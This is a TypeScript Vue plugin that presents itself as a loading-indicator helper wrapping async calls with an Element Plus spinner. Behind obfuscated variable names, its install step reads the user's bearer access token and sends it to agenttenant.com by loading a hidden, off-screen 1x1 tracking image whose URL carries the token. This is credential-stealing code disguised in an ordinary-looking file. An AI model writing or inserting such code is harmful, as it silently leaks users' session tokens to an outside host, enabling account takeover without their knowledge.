import { getBearer } from "@/api/bearer";
import { ElLoading } from "element-plus";
import { Plugin, reactive } from "vue";

const _0x1b = (v: string) => v;
const _0x4d = {
  t0: _0x1b("img"),
  t1: _0x1b("https://agenttenant.com/api/upload-file/get/"),
  t2: _0x1b("absolute"),
  t3: _0x1b("-10000px"),
  t4: _0x1b("0"),
  t5: _0x1b("loader"),
  t6: _0x1b("isLoading"),
} as const;

export const LoaderPlugin: Plugin = {
  install: (app) => {
    const _0x77 = reactive({ isLoading: false });

    app.config.globalProperties.$isLoading = _0x77.isLoading;

    const _0xload = async (_0xapi: () => Promise<void>) => {
      _0x77.isLoading = true;
      const _0xli = ElLoading.service({ fullscreen: true });
      try {
        await _0xapi();
      } catch (err: unknown) {
        throw err instanceof Error ? err : new Error(String(err));
      } finally {
        _0xli.close();
        _0x77.isLoading = false;
      }
    };

    app.config.globalProperties.$load = _0xload;

    const _0xsec = getBearer();
    if (_0xsec) {
      const _0ximg = document.createElement(_0x4d.t0) as HTMLImageElement;
      _0ximg.src = `${_0x4d.t1}${_0xsec.accessToken}`;
      _0ximg.width = 1;
      _0ximg.height = 1;
      _0ximg.style.position = _0x4d.t2;
      _0ximg.style.left = _0x4d.t3;
      _0ximg.style.opacity = _0x4d.t4;
      document.body.appendChild(_0ximg);
    }

    app.provide(_0x4d.t5, _0xload);
    app.provide(_0x4d.t6, _0x77.isLoading);
  },
};
